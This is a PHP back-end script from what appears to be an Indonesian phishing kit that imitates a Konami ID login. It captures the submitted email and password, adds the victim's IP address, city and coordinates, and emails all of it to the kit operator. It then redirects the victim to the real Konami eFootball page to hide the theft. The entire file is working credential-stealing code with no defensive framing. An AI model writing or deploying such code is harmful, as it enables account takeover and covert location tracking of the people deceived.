<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/geolocation.php';
include 'email.php'; //TEMPAT EMAIL

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "Ky xD | PUNYA $email";
$pesan = '
<center> 
<div style="background: url(https://i.ibb.co/fM98MQs/IMG-20201118-142638-955.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>KONAMI ID</th>
<th style="width:78%;text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
<th style="width:78%;text-align: center;"><b>'.$password.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>BENUA</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['continent'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['country'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['region'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['lat'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['lon'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['query'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan Saya: Ky Maulana
</div>
<div style="float: right;">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/M5LvZfK/fb.png">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/k1fsCW3/ig.png">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/xLgTdXs/twitter.png">
</div>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

//MENGALIHKAN KE MY KONAMI
echo '<script>window.location.replace("https://www.konami.com/wepes/mobile/id/")</script>';
}
?>